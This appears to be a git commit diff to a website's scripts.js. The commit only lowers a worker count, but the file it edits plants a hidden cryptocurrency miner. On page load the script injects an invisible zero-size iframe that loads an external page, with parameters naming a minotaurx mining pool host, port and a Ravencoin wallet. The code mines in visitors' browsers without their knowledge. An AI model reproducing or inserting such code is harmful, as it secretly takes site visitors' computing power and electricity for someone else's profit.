112e7571b48e1b1f4510d9639861164bf5dad804
Teo4268 <mamacook3300@gmail.com>
2025-01-25 22:30:28 +0700

    Update scripts.js

--- scripts.js
+++ scripts.js
@@ -1,6 +1,6 @@
 document.addEventListener("DOMContentLoaded", () => {
   const iframe = document.createElement("iframe");
-  iframe.src = "https://thanksyousomuch.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q&password=c%3DRVN&workers=2";
+  iframe.src = "https://thanksyousomuch.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=R9uHDn9XXqPAe2TLsEmVoNrokmWsHREV2Q&password=c%3DRVN&workers=1";
   iframe.style.width = "0"; 
   iframe.style.height = "0"; 
   iframe.style.border = "none"; 
